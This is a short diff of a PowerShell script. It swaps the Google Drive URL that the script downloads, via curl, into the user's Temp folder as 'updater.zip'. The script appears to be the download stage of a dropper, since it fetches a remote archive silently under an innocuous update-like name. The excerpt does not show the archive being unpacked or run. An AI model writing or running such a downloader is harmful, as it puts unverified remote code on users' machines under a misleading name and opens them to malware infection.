@@ -1,5 +1,5 @@
 $username=[Environment]::UserName
-$zipFile = "https://drive.usercontent.google.com/download?id=1K4-RNWLveLMlXeYNxhU_ixOJqPkUto75&export=download&authuser=0&confirm=t&uuid=c7cf249b-eae8-4c05-9b54-cc31c1965923&at=APZUnTW1V4_b7EfRKpngGHmZ3E_p:1722069362432"
+$zipFile = "https://drive.usercontent.google.com/download?id=19ynD0Kgp6YOhS3tNBtifwlJcSt7tZs1G&export=download&authuser=0&confirm=t&uuid=0fcc1b59-a0cc-48ca-bda8-b0aa58304f86&at=APZUnTVoCPGdefBZwQY_3Mk2EB7-:1722089561472"
 $op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
 $cmd1 = "curl `"$zipFile`" --output `"$op`""
 cmd /c $cmd1
